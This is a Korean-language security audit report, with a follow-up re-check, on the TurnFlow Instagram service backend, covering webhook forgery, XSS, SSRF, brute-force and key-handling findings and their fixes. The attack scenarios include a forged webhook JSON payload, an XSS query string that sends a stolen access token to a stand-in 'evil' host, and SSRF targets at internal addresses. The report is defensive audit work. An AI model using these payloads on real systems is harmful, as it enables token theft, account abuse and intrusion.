# TurnFlow Backend 보안 취약점 점검 보고서

> **최초 작성:** 2026-06-25
> **재점검(v2):** 2026-07-06 — 전 항목을 현재 코드에 대해 재검증 (아래 **§0.5 재점검 요약** 참조)
> **대상:** TurnFlow Instagram Service Backend (Django 5.0 + DRF, `api.turnflow.clfy.ai.kr`)
> **점검 범위:** 1차 출시 기능(로그인/회원가입, 링크페이지 생성·공개, DM 자동화)을 중심으로 한 전체 API 서버 코드(약 70,000 LOC)
> **방법론:** 16개 공격면 차원을 병렬 정적 감사 → finding 별로 실제 코드를 재확인하는 적대적 검증(false-positive 색출) → 배포 토폴로지 기준 익스플로잇 가능성 보정
> **최초 결과 요약:** 확정 취약점 **100건** (Critical 1 · High 11 · Medium 25 · Low 46 · Info 17), 검토 후 오탐으로 제외 5건

---

## 0.5 재점검 요약 (v2 · 2026-07-06)

최초 감사(2026-06-25) 이후 **IG 웹훅 HMAC 검증 도입**, **결제 PayApp → 토스페이먼츠 전환**, **DM 거버너/플랜 한도 배선** 등 다수 변경이 있었습니다. 원본 16개 차원의 **각 finding을 현재 코드에 대해 재검증**했고, Critical/High가 "해결됐다"고 판정될 때마다 **적대적 반증(기본 프로덕션 설정에서 여전히 익스플로잇 가능한가)** 을 수행했습니다.

### 상태 범례
| 배지 | 의미 |
|:---:|---|
| ✅ **해결** | 기본 프로덕션 설정에서 완전히 막힘 (코드로 증명) |
| 🔄 **무효** | 관련 기능/코드가 제거·전환되어 finding 전제가 소멸 |
| ⚠️ **부분** | 메커니즘은 추가됐으나 기본값 off / 미배선 / 부분 적용 |
| ❌ **미해결** | 최초 감사 상태와 동일 |

### 상태 분포 (중복·파생 정리 기준)
- ✅ 해결: **약 10건** (M-13, M-15, M-19, healthz 누출, Swagger 노출, SVG sanitizer, YouTube 콜백 XSS, 어드민 감사로그 커버리지 등)
- 🔄 무효(PayApp 소멸 등): **약 8건** (M-16, M-17, M-23, Low 결제 var1/var2, 오탐 5건 재확인)
- ⚠️ 부분: **약 20건** (C-1/H-3/H-6/H-10 웹훅 클러스터, H-7, M-6, M-11, M-12, M-18 등)
- ❌ 미해결: **약 60건** (H-1, H-2, H-4, H-5, H-8, H-9, 대부분의 Low/Info)

### 가장 중요한 변화 3가지

**① IG 웹훅 HMAC 서명 검증 — 코드는 완비, 그러나 기본값 OFF ⚠️**
`_verify_webhook_signature()`([apps/integrations/views.py:3815](apps/integrations/views.py#L3815))가 구현·배선되었고(POST 최상단 [3875](apps/integrations/views.py#L3875)에서 호출, 타이밍-세이프 `hmac.compare_digest`), 앱 시크릿도 실제 설정돼 있어 위조 서명을 정확히 판별합니다. **그러나** 차단(403)은 `WEBHOOK_HMAC_ENFORCED` 플래그에 전적으로 의존하는데, 이 값이 [base.py:566](config/settings/base.py#L566)에서 **기본 `False`(관측 모드)** 이고, `.env.production.example`을 포함해 **저장소의 어떤 배포 산출물(.env·compose·deploy)에도 `True`로 설정된 곳이 없습니다**(전수 grep 확인). 적대적 재확인 결과: **기본 프로덕션 설정에서는 서명 불일치 시 경고 로그만 남기고 위조 페이로드를 그대로 처리** → 원 C-1 익스플로잇(위조 웹훅 → 임의 DM 트리거)이 **여전히 성립**합니다.
→ **새 P0(가장 저렴한 최우선 조치): `.env.production`에 `WEBHOOK_HMAC_ENFORCED=True` 추가 + `.env.production.example`에 명시.** 코드 변경 없이 1줄로 C-1·H-3·H-6·H-7·H-10을 동시에 완전 차단. (부차: 앱 시크릿 미설정 시 검증을 skip하는 fail-open 경로도 fail-closed로 전환 권장.)

**② 결제 PayApp → 토스페이먼츠 빌링키 정기결제 전환 🔄 (M-16·M-17·M-23 무효화)**
PayApp `feedback` 엔드포인트가 완전히 제거되고([commit b451224](.)), 토스 빌링키 정기결제로 전환됐습니다. 토스 웹훅(`TossWebhookView`, [apps/billing/toss_views.py:344](apps/billing/toss_views.py#L344))은 **본문을 신뢰하지 않고 `paymentKey`로 결제 조회 API를 재호출**([apps/billing/tasks.py:511](apps/billing/tasks.py#L511))해 실제 상태/금액/주문 소유권을 확인하며, `dedup_key` UNIQUE로 중복 수신을 차단합니다. 정기결제 금액은 클라이언트가 아니라 **서버가 가격 스냅샷에서 계산**(`_renewal_amount_for`)하므로, 원 "0원/임의금액 유료화"(M-16)·"본문 var1/var2 신뢰 크로스계정 조작"(M-23)·"정적 시크릿 단일검사"(M-17) 벡터가 소멸했습니다. (단 레퍼럴 악용 M-18은 부분 잔존 — 아래 참조.)

**③ DM 안전속도 거버너 + 플랜 월 한도 배선 완료 ✅ (M-13·M-15 해결)**
`rate_governor.check()`가 모든 발송 태스크 진입부([apps/integrations/tasks.py:235](apps/integrations/tasks.py#L235))에 단일 지점으로 배선되었고(`DM_GOVERNOR_ENABLED=True` 기본), 플랜 월 DM 한도도 발송 직전 `check_dm_quota(owner)`로 강제됩니다([apps/billing/dm_limits.py](apps/billing/dm_limits.py), commit af73350). 죽은 코드였던 거버너가 실동작합니다.

### 그 외 해결/개선
- ✅ **M-19** Caddy `@external` 라우팅 경로가 실제 경로와 일치하도록 교정 — 격리 티어 우회 해소.
- ✅ **healthz** DB 예외 메시지 노출 제거(이제 `type(e).__name__`만 로깅, 응답은 상태만).
- ✅ **Swagger/ReDoc/schema**를 `DEBUG` 한정 등록 — 프로덕션 무인증 API 표면 공개 차단.
- ✅ **SVG 업로드 sanitizer**(defusedxml + 태그 화이트리스트 + `javascript:`/`data:` 차단) 도입.
- ✅ **YouTube OAuth 콜백** XSS를 `json.dumps` + `</` 이스케이프 패턴으로 안전화(H-5의 IG 콜백에 그대로 이식 가능).
- ✅ **어드민 감사로그** 커버리지 개선(모든 mutation이 `AdminActionLog` 기록), 실패 시 무음 처리는 의도된 설계로 확인.
- ⚠️ **H-7** 팔로우게이트 postback에 계정 검증 추가([commit 362dbb5](.)) — 단, 이는 **정상 멀티계정 오라우팅 방어**이지 위조 저항이 아님(공격자가 `recipient.id`를 대상 계정으로 맞추면 통과). 위조 벡터는 여전히 ①(HMAC enforce)에 의존.
- ⚠️ **M-6** `is_staff` 변경 시 `is_superuser` 요구 추가로 권한상승은 일부 차단. 단일 역할 등급은 유지.

### ✅ P0 조치 완료 (2026-07-06) — 코드 반영 + 회귀 테스트 통과

아래 P0 6건을 코드로 조치했습니다(P0-7만 운영 조치 필요). 변경 파일은 byte-compile·prod 설정 로드·SSRF/XSS/로그 마스킹 런타임 검증·앱 테스트(신규 실패 0건, 기존 `username=` 픽스처 실패는 무관) 통과.

| # | 항목 | 조치 전 | → 조치 후 | 반영 위치 |
|:---:|---|:---:|:---:|---|
| 1 | **웹훅 HMAC enforce** (C-1 및 파생 H-3/H-6/H-7/H-10) | ⚠️ 부분 | ✅ **완료** | `prod.py` 기본 `WEBHOOK_HMAC_ENFORCED=True`(secret 미설정 시 부팅 거부) + `views.py` secret 없으면 enforce 모드에서 fail-closed + `.env.production.example` 명시 |
| 2 | 인증 엔드포인트 레이트리밋 (H-1) | ❌ | ✅ **완료** | 로그인/가입/구글/이메일인증/재설정에 `ScopedRateThrottle` + `base.py` scope 등록(login 10/min 등, env override) |
| 3 | `SECRET_KEY` prod 부팅 가드 (H-2) | ❌ | ✅ **완료** | `prod.py` — insecure/placeholder/50자 미만이면 `ImproperlyConfigured` |
| 4 | IG OAuth 콜백 XSS (H-5, M-8) | ❌ | ✅ **완료** | `views.py` — HTML은 `escape()`, JS는 `_js_embed()`(json.dumps+`</`+U+2028/9), `str(dict)` 직렬화 제거 |
| 5 | 외부 이미지 재업로드 SSRF (H-4) | ❌ | ✅ **완료** | 공용 `apps/core/ssrf.py` 신설 → `reupload._download`에 `assert_public_url` + 리다이렉트 hop 재검증 opener |
| 6 | IG 토큰 평문 로깅 (H-9, M-22) | ❌ | ✅ **완료** | `services.raise_for_status_clean`(토큰 URL 제거) + `scrub_secrets` + 전역 로깅 마스킹 필터(`apps/core/log_filters.py`) |
| 7 | `deploy/backups/.env.backup` 시크릿 회전 | ❌ | ⏳ **운영 조치 필요** | R2 키·Telegram 토큰을 각 서비스 콘솔에서 회전 후 파일 갱신(코드로 불가) |
| ~~8~~ | ~~PayApp 결제 금액 검증 (M-16)~~ | 🔄 무효 | — | 토스 전환으로 소멸 |

---

## 0. 한눈에 보기 (Executive Summary)

> ⚠️ **아래 심각도 분포는 최초 감사(2026-06-25) 기준입니다.** 현재 상태는 §0.5 및 각 finding의 `↻ 재점검` 주석을 참조하세요.

### 심각도 분포 (최초)

| 심각도 | 건수 | 의미 |
|:---:|:---:|---|
| 🔴 **Critical** | 1 | 즉시(출시 전) 반드시 수정 |
| 🟠 **High** | 11 | 출시 전 수정 강력 권장 |
| 🟡 **Medium** | 25 | 출시 직후 우선 처리 |
| ⚪ **Low** | 46 | 계획적 개선 |
| ℹ️ **Info** | 17 | 방어 심층화 / 관측 |

### 가장 중요한 단일 결함 — Instagram 웹훅 서명 미검증 → **⚠️ 부분 해결(코드 완비·기본 off)**

**11개 High 중 4개와 유일한 Critical이 모두 같은 뿌리에서 나옵니다.** Instagram 웹훅 수신 엔드포인트가 Meta가 보내는 `X-Hub-Signature-256` HMAC 서명을 **전혀 검증하지 않고**, 인증·레이트리밋도 없이 인터넷에 공개되어 있(었)습니다. 이 한 줄짜리 누락이:

- 임의 IG 계정의 DM 자동발송 트리거 (Critical)
- 멀티테넌시 경계 붕괴(타 워크스페이스 캠페인 타겟팅) (High)
- follow-gate 우회 + reward DM 탈취 (High)
- 무인증 Celery 큐 플러딩 DoS (High)
- 발송 통계/검증 지표 위조 (High)

를 동시에 가능하게 합니다.

> **↻ 재점검 2026-07-06 — ⚠️ 부분:** HMAC 검증 함수가 **구현·배선되었으나** `WEBHOOK_HMAC_ENFORCED` 기본값이 `False`(관측 모드)이고 어떤 배포 산출물에도 `True`로 설정돼 있지 않아, **기본 프로덕션에서 위조 웹훅이 여전히 처리**됩니다. **env 1줄(`WEBHOOK_HMAC_ENFORCED=True`)** 로 완전 차단 — 여전히 단일 최우선 조치입니다.

### 출시 전 반드시 막아야 할 6가지 (P0) — 최초 기준 (현재 상태 병기)

| # | 취약점 | 심각도 | 핵심 위치 | ↻ 현재 |
|:---:|---|:---:|---|:---:|
| 1 | IG 웹훅 HMAC 서명 미검증 | 🔴 Critical | [apps/integrations/views.py:3679](apps/integrations/views.py#L3679) | ⚠️ 부분 (enforce off) |
| 2 | 모든 인증 엔드포인트 brute-force 무방비 | 🟠 High | [apps/authentication/views.py:284](apps/authentication/views.py#L284) | ❌ 미해결 |
| 3 | `SECRET_KEY` insecure default + fail-fast 가드 부재 | 🟠 High | [config/settings/base.py:17](config/settings/base.py#L17) | ❌ 미해결 |
| 4 | IG OAuth 콜백 반사형 XSS | 🟠 High | [apps/integrations/views.py:296](apps/integrations/views.py#L296) | ❌ 미해결 |
| 5 | 외부 이미지 재업로드 SSRF | 🟠 High | `apps/pages/services/external_importers/reupload.py:176` | ❌ 미해결 |
| 6 | PayApp 결제 금액 미검증(0원 유료화) | 🟡 Medium | [apps/billing/payment_views.py:165](apps/billing/payment_views.py#L165) | 🔄 무효 (토스 전환) |

---

## 1. 배포 토폴로지와 위협 모델

점검은 아래 실제 배포 구조를 전제로 익스플로잇 가능성을 평가했습니다.

```
인터넷
  │  (turnflow.link  = 프론트엔드, Cloudflare 배포 — 별개)
  │  (api.turnflow.clfy.ai.kr = 백엔드)
  ▼
[호스트 Caddy 컨테이너]  ── TLS 종단 + X-Forwarded-Proto 주입
  ├─ /api/v1/.../webhook*  → web_webhook  (gthread, t/o 10)
  ├─ (격리 의도) 외부 IO   → web_external (← M-19 라우팅 교정 완료, ✅)
  └─ 그 외 /api,/admin     → web_dashboard
        │   (모두 내부 docker bridge: turnflow_instagram_net)
        ▼
   pgbouncer → PostgreSQL 16   |   Redis 7 (브로커+캐시)   |   Celery (dm/followup/default/billing/beat)
```

**보안상 핵심 함의:**

- **인터넷에 직접 노출되는 것은 Caddy(80/443)뿐.** db/redis/pgbouncer는 내부망 전용이므로 외부에서 직접 공격 불가 → SSRF·컨테이너 침해 시에만 내부 자원 도달 위험.
- **Caddy는 TLS/프록시만 수행.** 레이트리밋·WAF·서명 게이트가 없으므로 **애플리케이션 레벨 방어가 없으면 그대로 외부에 노출**됩니다. (Cloudflare는 프론트엔드 전용이라 백엔드 API를 보호하지 않음.)
- **`SECRET_KEY` 하나가 JWT 서명키 + IG 토큰 암호화키를 겸함.** 이 값의 유출/약함은 전면 계정 탈취 + 전 테넌트 토큰 복호화로 직결됩니다.
- **실제 런타임은 `USE_R2=True`** (객체 스토리지 = Cloudflare R2 퍼블릭 버킷). 따라서 미디어는 Django가 아니라 R2 공개 도메인에서 서빙됩니다(아래 Low 참조).
- **출시 범위 = 인증 + 링크페이지 + DM 자동화.** insights는 kill-switch로 차단(503), tiktok/youtube/coupang은 MOCK/미출시 — 해당 결함은 보고하되 우선순위를 낮췄습니다.
- **(v2 추가) 결제는 토스페이먼츠 빌링키 정기결제.** 토스 웹훅은 별도 뷰(`TossWebhookView`)로 처리하며 본문 신뢰 대신 `paymentKey` 재조회로 검증합니다.

---

## 2. 🔴 Critical

### C-1. Instagram 웹훅 POST에 `X-Hub-Signature-256` HMAC 서명 검증이 전무 — 위조 이벤트로 임의 IG 계정 DM 트리거

| 항목 | 내용 |
|---|---|
| **위치** | [apps/integrations/views.py:3679](apps/integrations/views.py#L3679) (instagram_webhook POST 분기) |
| **분류** | Improper Authentication / Webhook Forgery (OWASP A07/A08) · CWE-345 |
| **익스플로잇** | likely (외부 무인증 도달 + 완화 레이어 전무) |

**설명.** `instagram_webhook`의 POST 핸들러는 `@api_view(["GET","POST"]) + @permission_classes([AllowAny])`이며, `request.body`를 `json.loads`한 뒤 `payload.get("object") == "instagram"`만 확인하고 곧바로 `process_comment_and_send_dm.delay(...)`로 처리합니다. Meta가 모든 웹훅에 부착하는 `X-Hub-Signature-256`(= `HMAC-SHA256(APP_SECRET, raw_body)`) 헤더를 **전혀 검증하지 않습니다.** 코드 전체에서 HMAC 검증은 `services.py`의 OAuth `signed_request`(앱 삭제 콜백) 전용일 뿐입니다. 이 엔드포인트는 Caddy `@webhook` 핸들을 통해 `web_webhook`으로 공개 프록시되어 인터넷에서 직접 도달 가능합니다.

**공격 시나리오.**
1. 공격자가 대상 비즈니스의 **공개 IG numeric user id**(`external_account_id`)와 미디어 id, 캠페인 트리거 키워드를 수집(모두 공개 게시물에서 획득 가능).
2. 서명 없이 위조 페이로드 POST:
   ```json
   {"object":"instagram","entry":[{"id":"<피해자_ig_user_id>",
     "changes":[{"field":"comments","value":{"id":"forged_x","text":"<트리거키워드>",
       "from":{"id":"<임의_수신자_IGSID>","username":"victim"},"media":{"id":"<media_id>"}}}]}]}
   ```
3. `process_comment_and_send_dm`이 `candidate_qs.filter(ig_connection__external_account_id=entry.id)`로 **피해자 계정 캠페인을 매칭**하고 `_enqueue_send_dm`으로 실제 DM 발송을 큐잉.
4. 결과: 피해자 계정 토큰으로 공격자가 지정한 대상에게 스팸/피싱 DM 발송(→ 계정 차단·Meta 정책 위반), 발송 한도 소진. 추가로 위조 `read`/`echo` 메시징 이벤트로 `SentDMLog`를 거짓 `DELIVERED`/`READ`로 승격해 발송 보증 지표·통계를 오염.

**권고 (단일 최우선 조치).** POST 처리 **최상단**에서 서명 검증:
```python
import hmac, hashlib
raw = request.body
sig = request.META.get("HTTP_X_HUB_SIGNATURE_256", "")
expected = "sha256=" + hmac.new(settings.META_APP_SECRET.encode(), raw, hashlib.sha256).hexdigest()
if not (sig and hmac.compare_digest(sig, expected)):
    return HttpResponse(status=403)   # 태스크 enqueue 이전에 차단
```
- `META_APP_SECRET`/`INSTAGRAM_APP_SECRET`이 빈 값이면 검증이 무력화되므로 **prod 미설정 시 fail-closed**(403 또는 부팅 실패).
- 서명 검증 실패 이벤트는 enqueue 금지. comments 트리거도 `EventInbox` 멱등 INSERT 후 최초 1회만 처리.
- 보조로 Caddy `@webhook` 블록에 IP 레이트리밋, `DATA_UPLOAD_MAX_MEMORY_SIZE` 축소.

> 이 한 가지 수정으로 아래 **H-3, H-6, H-7, H-10** (모두 같은 뿌리)이 동시에 차단됩니다.

> **↻ 재점검 2026-07-06 — ⚠️ 부분해결 (코드 완비 · 기본 off · 미배선).**
> - 권고했던 검증이 실제로 구현됨: `_verify_webhook_signature()` [apps/integrations/views.py:3815-3837](apps/integrations/views.py#L3815) — `HMAC-SHA256(app_secret, request.body)` + 타이밍-세이프 `hmac.compare_digest`. POST 진입 최상단 [3875](apps/integrations/views.py#L3875)에서 호출. 앱 시크릿이 실제 설정돼 있어(`get_instagram_app_secret`) 위조/무서명을 정확히 `False`로 판별.
> - **그러나 차단이 게이팅됨:** [base.py:566](config/settings/base.py#L566) `WEBHOOK_HMAC_ENFORCED = config(..., default=False)`. `False`면 [views.py:3876-3882](apps/integrations/views.py#L3876)가 **경고 로그만 남기고 위조 페이로드를 그대로 처리 진행**(403 아님).
> - **적대적 확인:** `WEBHOOK_HMAC_ENFORCED`가 `.env`·`.env.production.example`·`docker-compose*.yml`·`prod.py`·`deploy/` 어디에도 `True`로 설정돼 있지 않음(전수 grep). 즉 **기본 프로덕션 설정에서 원 익스플로잇이 그대로 성립.** `.env.production.example`은 다른 하드닝 토글(`WEBHOOK_ASYNC_MESSAGING=True`)은 안내하면서 이 항목만 누락 → 운영자가 켜지 않을 가능성.
> - **조치:** `.env.production`에 `WEBHOOK_HMAC_ENFORCED=True` 설정 + example에 명시(코드 변경 불필요). 시크릿 미설정 시 `return True`로 검증을 skip하는 fail-open 경로도 fail-closed 권장.
>
> **→ ✅ 2026-07-06 조치 완료:** `prod.py`가 `WEBHOOK_HMAC_ENFORCED`를 **기본 True**로 상향(+ enforce인데 앱 시크릿 미설정이면 부팅 거부), `views.py`의 secret-없음 경로도 enforce 모드에서 **fail-closed**(False 반환), `.env.production.example`에 항목 명시. 프로덕션 기본값에서 위조 웹훅이 403으로 차단됨(H-3/H-6/H-7/H-10 동시 해소).

---

## 3. 🟠 High

> H-3 / H-6 / H-7 / H-10은 C-1(웹훅 서명 미검증)에서 파생됩니다. C-1을 고치면(=`WEBHOOK_HMAC_ENFORCED=True`) 함께 해소되지만, 각각 독립적 방어선(멱등성·수신자 고정·레이트리밋)도 함께 두는 것을 권장합니다.

### H-1. 모든 인증 엔드포인트에 brute-force 스로틀/계정 잠금이 전무

- **위치:** [apps/authentication/views.py:284](apps/authentication/views.py#L284) (로그인), [config/settings/base.py:226](config/settings/base.py#L226) (`DEFAULT_THROTTLE_RATES`에 auth scope 부재), [apps/emails/views_auth.py:228](apps/emails/views_auth.py#L228) (비번 재설정)
- **익스플로잇:** proven (코드/설정상 차단막 전무, 외부 직접 도달)
- **설명.** 로그인/회원가입/토큰갱신/비밀번호재설정/이메일인증/Google로그인 어느 뷰에도 `throttle_classes`가 없고, 전역 `DEFAULT_THROTTLE_CLASSES`도 비활성이며 `django-axes` 등 잠금 메커니즘도 없습니다. Caddy 레벨 레이트리밋도 없습니다.
- **공격:** 유출 자격증명 목록으로 `POST /api/v1/auth/login/`을 초당 수백 회 시도(크리덴셜 스터핑) → 약한 비밀번호 계정 탈취. `/password/reset-request/`를 반복 호출해 특정 피해자 대상 메일 폭탄 + Resend 비용 증폭.
- **권고:** 로그인·구글로그인·비번재설정·이메일인증 뷰에 `ScopedRateThrottle`(예: 로그인 IP+email 5~10/min, reset-request 3/hour/email) 추가 + 반복 실패 시 Redis 카운터/`django-axes` 기반 일시 잠금. 글로벌 `AnonRateThrottle` 안전망 도입. 이메일 인증 6자리 코드 입력 경로도 함께 스로틀(코드 추측 방어).

> **↻ 재점검 — ❌ 미해결.** `LoginView`·`VerifyEmailView`·`PasswordReset*` 모두 `throttle_classes` 없음. [base.py:229](config/settings/base.py#L229) `DEFAULT_THROTTLE_RATES`에 auth scope 미등록(external_import/insights_sync/link_meta만 존재). django-axes 미도입. ~~**남은 P0 #2**~~ → ✅ **2026-07-06 조치 완료**: 로그인/가입/구글/이메일인증/재설정에 `ScopedRateThrottle` + `base.py` scope 등록(login 10/min 등).

### H-2. insecure `SECRET_KEY` default가 prod에 상속 + fail-fast 가드 부재

- **위치:** [config/settings/base.py:17](config/settings/base.py#L17), [config/settings/base.py:277](config/settings/base.py#L277) (`SIGNING_KEY=SECRET_KEY`), [apps/integrations/encryption.py:23](apps/integrations/encryption.py#L23) (Fernet 키 = `sha256(SECRET_KEY)`)
- **익스플로잇:** conditional (운영자 오설정 시 발현하나 발현 시 치명적)
- **설명.** `SECRET_KEY = config("SECRET_KEY", default="django-insecure-local-dev-key-change-in-production")`. prod.py는 base를 그대로 import하며, `.env.production`에 `SECRET_KEY` 줄이 **누락/오타**되면 GitHub에 평문으로 적힌 이 default로 **조용히 부팅**됩니다. 이 키는 JWT 서명 + IG 토큰 암호화를 겸하므로, 이 경우 공격자는 추측·유출 없이 코드만으로 임의 사용자 JWT를 위조하고 DB의 모든 IG 토큰을 복호화할 수 있습니다.
- **권고:** prod.py 부팅 검증:
  ```python
  if (not SECRET_KEY or SECRET_KEY.startswith("django-insecure")
          or "CHANGE_ME" in SECRET_KEY or len(SECRET_KEY) < 50):
      raise ImproperlyConfigured("SECRET_KEY must be a strong random value in production")
  ```
  + `deploy.sh`에 `.env.production` 필수키(SECRET_KEY/DB_PASSWORD) 존재·placeholder 검사 추가.

> **↻ 재점검 — ❌ 미해결.** [base.py:17](config/settings/base.py#L17) insecure default 유지, `prod.py`(전체)에 부팅 가드 없음. ~~**남은 P0 #3**~~ → ✅ **2026-07-06 조치 완료**: `prod.py`에 fail-fast 가드(insecure/placeholder/50자 미만 → `ImproperlyConfigured`).

### H-3. 위조 웹훅으로 멱등성 우회 + 임의 워크스페이스 타겟팅 *(C-1 파생)*

- **위치:** [apps/integrations/views.py:3659](apps/integrations/views.py#L3659), `apps/integrations/services.py:468` (`build_idempotency_key`), `apps/integrations/tasks.py:122`
- **설명.** DM 중복 차단은 `idempotency_key = sha256(workspace:ig_user:comment_id:campaign)`의 DB UNIQUE로만 보장되는데, 서명이 없으므로 `comment_id`가 **공격자 완전 통제 입력**입니다. 매 요청 다른 `comment_id` → 매번 새 키 → 멱등성 무력화 → 무제한 발송 큐잉. 60초 recipient 쿨다운도 `from.id`만 바꾸면 우회. `entry.id → external_account_id` 매칭만으로 **임의 테넌트 계정 타겟팅**이 가능(멀티테넌시 경계 붕괴).
- **권고:** C-1의 HMAC 검증(루트 차단). 추가로 comments 트리거도 `EventInbox(event_key=f"comment:{comment_id}:{campaign_id}")` 멱등 INSERT 후 최초 1회만 enqueue.

> **↻ 재점검 — ⚠️ 부분(C-1 종속).** `SentDMLog.create_idempotent()`의 UNIQUE 방어는 있으나 키에 공격자 통제 `comment_id`가 들어가 값만 바꾸면 우회 가능. comments 경로는 여전히 `EventInbox` 멱등화 미적용(echo/read만 적용). C-1 enforce 시 근본 해소.

### H-4. 외부 이미지 재업로드(`reupload._download`)에 SSRF 가드 전무

- **위치:** `apps/pages/services/external_importers/reupload.py:176` (`urllib.request.urlopen`, 가드 없음), `:92` (호스트/IP 무검증), 진입점 [apps/pages/aiviews.py:1106](apps/pages/aiviews.py#L1106) + `apps/ai_jobs/tasks.py:786`
- **익스플로잇:** likely (인증 + 무료 Litt.ly 계정만 있으면 재현)
- **설명.** `reupload_images=true` 경로는 임포트한 외부 페이지의 이미지 URL을 SSRF 가드(사설/루프백/링크로컬 IP 차단, scheme 제한, 리다이렉트 제어) **없이** `urlopen`으로 다운로드하며 리다이렉트를 기본 추적합니다. 이미지 URL의 출처(Litt.ly/Linktree/인포크)는 공격자가 자기 계정 페이지에 임의로 심을 수 있습니다. `link_meta.py`에는 견고한 `_assert_public_http_url` 가드가 있으나 이 경로엔 적용되지 않습니다(보호 비대칭).
- **공격:** 공격자가 자기 Litt.ly 페이지의 썸네일 URL을 `http://pgbouncer:6432` / `http://169.254.169.254/...` 같은 내부 주소(또는 302로 내부 주소로 리다이렉트하는 자기 서버)로 지정 → `POST /api/v1/pages/ai/import-external/`로 임포트 → celery 워커가 내부 주소를 GET. 실패 사유가 `ReuploadReport.failures`로 응답에 노출돼 **blind SSRF 포트 스캔 오라클**이 성립.
- **권고:** `link_meta._assert_public_http_url`를 공용 유틸로 추출해 `_download` 호출 전 모든 URL을 검증(scheme·공인 IP·IPv4-mapped 언랩). `urlopen` 대신 리다이렉트 **비추적** opener 또는 hop마다 IP 재검증. 이미지 호스트를 소스별 CDN 도메인으로 화이트리스트. `failures` 응답은 일반화된 사유만 노출.
  - *(자체 IDC라 169.254.169.254 클라우드 메타데이터는 없을 가능성이 높음 → 현실적 표적은 내부 admin/API/모니터링 HTTP + 포트 존재 오라클)*

> **↻ 재점검 — ❌ 미해결.** `reupload._download`([reupload.py:176](apps/pages/services/external_importers/reupload.py#L176))에 SSRF 가드 여전히 부재, `_assert_public_http_url` 미적용. ~~**남은 P0 #5**~~ → ✅ **2026-07-06 조치 완료**: 공용 `apps/core/ssrf.py`(assert_public_url + 리다이렉트 hop 재검증 opener)를 `reupload._download`에 적용.

### H-5. 인증 불필요 IG OAuth 콜백의 반사형 XSS

- **위치:** [apps/integrations/views.py:296](apps/integrations/views.py#L296) (`connect_callback`, `permission_classes=[]`), `:313`/`:321` (`error` 무이스케이프 반영)
- **익스플로잇:** likely (무인증·무스로틀·무CSP, 페이로드 단순)
- **설명.** 공개 GET 콜백이 쿼리파라미터 `error`를 f-string HTML에 **두 컨텍스트로 무이스케이프 삽입**합니다: HTML 본문 `<p>{error}</p>`와 인라인 `<script>`의 JS 문자열 `message: '...: {error}'`. `error` 분기는 OAuth state(CSRF) 검증보다 앞이라 사전 조건이 전혀 없습니다.
- **공격:** `https://api.turnflow.clfy.ai.kr/api/v1/integrations/instagram/connect/callback/?error=';fetch('https://evil/'+localStorage.access_token);//` 류 링크를 피해자에게 전송 → api 오리진에서 임의 JS 실행. 세션 쿠키는 HttpOnly지만 JWT가 보통 localStorage에 있어 **토큰 탈취·인증 XHR·postMessage 위조**가 성립. (CSP 부재로 인라인 스크립트 그대로 실행)
- **권고:** HTML 본문은 `django.utils.html.escape(error)`, JS 데이터는 `json.dumps(...).replace("</","<\\/")`로 직렬화(같은 저장소 [apps/youtube/views.py:493](apps/youtube/views.py#L493)에 안전 패턴 존재). 더 근본적으로는 콜백이 raw HTML을 만들지 말고 프론트 결과 페이지로 302 리다이렉트(에러는 화이트리스트 enum만). *(같은 콜백 성공 경로의 `username`/`connection_dict` 무이스케이프 삽입은 Medium으로 별도 기재.)*

> **↻ 재점검 — ❌ 미해결.** `connect_callback`가 `error`를 HTML 본문([views.py:341](apps/integrations/views.py#L341))과 인라인 JS([:349](apps/integrations/views.py#L349)), 예외 메시지([:717](apps/integrations/views.py#L717))에 무이스케이프 삽입. CSP도 여전히 미설정. **참고:** 같은 저장소 YouTube 콜백([youtube/views.py:493](apps/youtube/views.py#L493))은 `json.dumps`+`</` 이스케이프로 안전화됨 — 동일 패턴을 H-5에 이식 가능. ~~**남은 P0 #4**~~ → ✅ **2026-07-06 조치 완료**: HTML은 `escape()`, JS는 `_js_embed()`(json.dumps+`</`+U+2028/9)로 직렬화, `str(dict)` 제거. 예외 메시지는 클라이언트에 노출 안 함.

### H-6. Instagram 웹훅 무인증 Celery 큐 플러딩 DoS *(C-1 파생)*

- **위치:** [apps/integrations/views.py:3654](apps/integrations/views.py#L3654), `apps/integrations/tasks.py:45`
- **설명.** 서명·인증·스로틀이 없어 누구나 위조 페이로드를 초당 수천 건 POST → `field=="comments"`마다 `process_comment_and_send_dm`(`autoretry_for=(Exception,)`, max_retries=3)이 `webhook_followup` 큐에 적재. 한 요청에 `entry/changes`를 수만 개 담아 단일 요청 대량 enqueue도 가능. 워커/Redis 브로커 포화 시 정상 사용자의 댓글→DM 자동화(핵심 기능)가 마비.
- **권고:** C-1의 서명 검증(enqueue 이전 403) + `entry/changes` 개수 상한 + `DATA_UPLOAD_MAX_MEMORY_SIZE` 축소 + Caddy `@webhook` IP 레이트리밋.

> **↻ 재점검 — ⚠️ 부분(C-1 종속).** EventInbox 파티션/`WEBHOOK_ASYNC_MESSAGING`은 echo·read 경로만 완화하며, **comments 경로는 여전히 멱등검사 이전에 무조건 `.delay()`** 로 enqueue → 위조 payload로 워커·브로커 포화 가능. C-1 enforce + `entry/changes` 개수 상한 + `DATA_UPLOAD_MAX_MEMORY_SIZE` 필요.

### H-7. 위조 postback으로 follow-gate 우회 + 임의 사용자에게 reward DM 강제 발송 *(C-1 파생)*

- **위치:** [apps/integrations/views.py:3571](apps/integrations/views.py#L3571) (`_maybe_dispatch_follow_gate`), `apps/integrations/tasks.py:1739` (`process_follow_gate_postback`), `:1817` (`_enqueue_reward_dm`)
- **설명.** 웹훅 payload가 `fg:{opening_log_id}`로 시작하면 `process_follow_gate_postback.delay(opening_log_id, sender_id)`가 호출되는데, `sender_id`(공격자 통제)를 검증 없이 reward 수신자로 사용하고 `opening.recipient_user_id`와 대조하지 않습니다. `gate_verify_follow=false`(button-only) 캠페인이면 팔로우 검증조차 건너뛰고 즉시 reward 발송, `gate_status`도 강제 `PASSED`로 오염.
- **완화/현실:** reward 실발송은 Meta 24h 윈도우에 막혀 "임의의 누구에게나"는 과장 — 그러나 button-only 캠페인에서 **자기 계정으로 위조 postback을 보내 팔로우 없이 reward를 수령하는 우회는 거의 확정적**이며, 타 사용자 opening의 `gate_status` 오염도 가능. `opening_log_id`(UUID)는 로그노출/IDOR로 확보 필요.
- **권고:** C-1 서명 검증 + `igsid == opening.recipient_user_id` 강제(불일치 skip) + `entry.id`와 opening 캠페인 소유 교차검증.

